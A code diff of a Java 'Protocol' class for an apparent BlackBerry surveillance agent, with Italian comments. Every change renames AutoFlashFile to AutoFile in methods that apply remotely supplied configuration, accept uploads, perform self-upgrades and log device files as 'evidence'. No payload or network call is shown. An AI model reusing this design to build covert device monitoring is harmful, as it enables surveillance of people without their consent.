@@ -26,7 +26,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
 import blackberry.utils.Check;
@@ -57,7 +57,7 @@ public abstract class Protocol {
 
     public synchronized static boolean saveNewConf(byte[] conf, int offset)
             throws CommandException {
-        final AutoFlashFile file = new AutoFlashFile(Path.USER()
+        final AutoFile file = new AutoFile(Path.USER()
                 + Path.CONF_DIR + Conf.NEW_CONF, true);
 
         file.create();
@@ -77,7 +77,7 @@ public abstract class Protocol {
     }
 
     public static void saveUpload(String filename, byte[] content) {
-        final AutoFlashFile file = new AutoFlashFile(Path.USER() + filename,
+        final AutoFile file = new AutoFile(Path.USER() + filename,
                 true);
 
         if (file.exists()) {
@@ -98,11 +98,11 @@ public abstract class Protocol {
     public static boolean upgradeMulti(Vector files) {
 
         try {
-            AutoFlashFile[] autoFiles = new AutoFlashFile[files.size()];
+            AutoFile[] autoFiles = new AutoFile[files.size()];
             // guarda se i file ci sono tutti e sono capienti e leggibili
             for (int i = 0; i < files.size(); i++) {
                 String file = (String) files.elementAt(i);
-                AutoFlashFile autoFile = new AutoFlashFile(file);
+                AutoFile autoFile = new AutoFile(file);
                 autoFiles[i] = autoFile;
 
                 if (!autoFile.exists() || !autoFile.isReadable()
@@ -118,7 +118,7 @@ public abstract class Protocol {
 
             // upgrade effettivo
             for (int i = 0; i < autoFiles.length; i++) {
-                AutoFlashFile autoFlashFile = autoFiles[i];
+                AutoFile autoFlashFile = autoFiles[i];
 
                 //#ifdef DEBUG
                 debug.trace("upgrading: " + autoFlashFile.getFullFilename());
@@ -150,9 +150,9 @@ public abstract class Protocol {
     }
 
     public static boolean upgradeMulti() {
-        final AutoFlashFile file_0 = new AutoFlashFile(Path.USER()
+        final AutoFile file_0 = new AutoFile(Path.USER()
                 + Protocol.UPGRADE_FILENAME_0, true);
-        final AutoFlashFile file_1 = new AutoFlashFile(Path.USER()
+        final AutoFile file_1 = new AutoFile(Path.USER()
                 + Protocol.UPGRADE_FILENAME_1, true);
 
         if (file_0.exists() && file_1.exists()) {
@@ -278,7 +278,7 @@ public abstract class Protocol {
     }
 
     public static void saveDownloadLog(String filefilter) {
-        AutoFlashFile file = new AutoFlashFile(filefilter, false);
+        AutoFile file = new AutoFile(filefilter, false);
         if (file.exists()) {
             //#ifdef DEBUG
             debug.trace("logging file: " + filefilter);
@@ -292,7 +292,7 @@ public abstract class Protocol {
                     .hasMoreElements();) {
                 String filename = (String) en.nextElement();
 
-                file = new AutoFlashFile(filename, false);
+                file = new AutoFile(filename, false);
                 if (file.isDirectory()) {
                     continue;
                 }
@@ -307,7 +307,7 @@ public abstract class Protocol {
         }
     }
 
-    private static void saveFileLog(AutoFlashFile file, String filename) {
+    private static void saveFileLog(AutoFile file, String filename) {
         //#ifdef DBC
         Check.requires(file != null, "null file");
         Check.requires(file.exists(), "file should exist");
@@ -429,7 +429,7 @@ public abstract class Protocol {
         //#endif
         int version = 2010031501;
 
-        AutoFlashFile file = new AutoFlashFile(filepath);
+        AutoFile file = new AutoFile(filepath);
         if (!file.exists()) {
             //#ifdef DEBUG
             debug.error("non existing file: " + filepath);
